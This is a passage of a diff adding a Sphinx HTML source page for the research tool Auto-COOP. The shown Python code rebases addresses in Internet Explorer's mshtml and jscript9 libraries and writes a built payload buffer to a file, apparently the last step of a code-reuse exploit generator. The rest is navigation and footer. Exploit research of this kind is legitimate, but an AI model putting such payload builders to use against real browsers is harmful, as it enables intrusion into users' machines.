+    <span class="n">rMshtml</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mh">0x63580000</span><span class="p">,</span> <span class="n">baseMshtml</span><span class="p">)</span>
+    <span class="n">rJscript</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mh">0x10000000</span><span class="p">,</span> <span class="n">baseJScript</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;mshtml&quot;</span><span class="p">:</span><span class="n">rMshtml</span><span class="p">,</span> <span class="s2">&quot;jscript9&quot;</span><span class="p">:</span><span class="n">rJscript</span><span class="p">}</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">build</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
+    
+    <span class="n">f</span> <span class="o">=</span> <span class="n">file</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="nb">print</span> <span class="s2">&quot;[i] Wrote </span><span class="si">%d</span><span class="s2"> bytes.&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    
+</pre></div>
+
+          </div>
+          
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+<h1 class="logo"><a href="../../../index.html">Auto-COOP</a></h1>
+
+
+
+
+
+
+
+
+<h3>Navigation</h3>
+<p class="caption"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../installation.html">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../installation.html#running-auto-coop">Running Auto-COOP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../modules.html">Packages</a></li>
+</ul>
+
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../../../index.html">Documentation overview</a><ul>
+  <li><a href="../../index.html">Module code</a><ul>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2018, Richard Viehoever.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.7.6</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.11</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
